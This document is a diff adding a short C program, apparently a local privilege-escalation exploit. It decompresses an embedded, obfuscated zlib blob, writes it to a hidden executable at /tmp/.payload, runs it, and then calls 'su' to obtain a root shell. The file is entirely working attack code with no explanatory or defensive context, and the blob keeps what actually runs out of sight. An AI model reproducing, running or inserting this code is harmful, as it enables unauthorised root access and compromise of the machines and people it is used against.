@@ -1,0 +1,62 @@
+#gcc -o exploit copy.c -lz
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <zlib.h>
+
+unsigned char compressed_data[] = {
+    0x78, 0xda, 0xab, 0x77, 0xf5, 0x71, 0x63, 0x64,
+    0x64, 0x80, 0x01, 0x12, 0x06, 0x3b, 0x06, 0x10,
+    0xaf, 0x82, 0xc1, 0x01, 0xcc, 0x77, 0x60, 0xc0,
+    0x04, 0x0e, 0x0c, 0x16, 0x0c, 0x30, 0x1d, 0x20,
+    0x9a, 0x15, 0x4d, 0x16, 0x99, 0x9e, 0x07, 0xe5,
+    0xc1, 0x68, 0x06, 0x01, 0x08, 0x65, 0x78, 0xc0,
+    0xf0, 0xff, 0x86, 0x4c, 0x7e, 0x56, 0x8f, 0x5e,
+    0x5b, 0x7e, 0x10, 0xf7, 0x5b, 0x96, 0x75, 0xc4,
+    0x4c, 0x7e, 0x56, 0xc3, 0xff, 0x59, 0x36, 0x11,
+    0xfc, 0xac, 0xfa, 0x49, 0x99, 0x79, 0xfa, 0xc5,
+    0x19, 0x0c, 0x0c, 0x0c, 0x00, 0x32, 0xc3, 0x10,
+    0xd3
+};
+
+int main() {
+    unsigned long dest_len = 65536;
+    unsigned char *decompressed = malloc(dest_len);
+
+    if (!decompressed) {
+        fprintf(stderr, "malloc failed\n");
+        return 1;
+    }
+
+    int ret = uncompress(decompressed, &dest_len,
+                        compressed_data, sizeof(compressed_data));
+
+    if (ret == Z_OK) {
+        printf("[+] Payload decompressed: %lu bytes\n", dest_len);
+
+        // Guardar en archivo ejecutable
+        int fd = open("/tmp/.payload", O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (fd > 0) {
+            write(fd, decompressed, dest_len);
+            close(fd);
+            printf("[+] Payload saved to /tmp/.payload\n");
+
+            // Ejecutar el payload
+            system("/tmp/.payload");
+        }
+    } else {
+        fprintf(stderr, "[-] Decompression failed: %d\n", ret);
+    }
+
+    free(decompressed);
+
+    // Ejecutar su
+    printf("[*] Executing su...\n");
+    system("su");
+
+    return 0;
+}
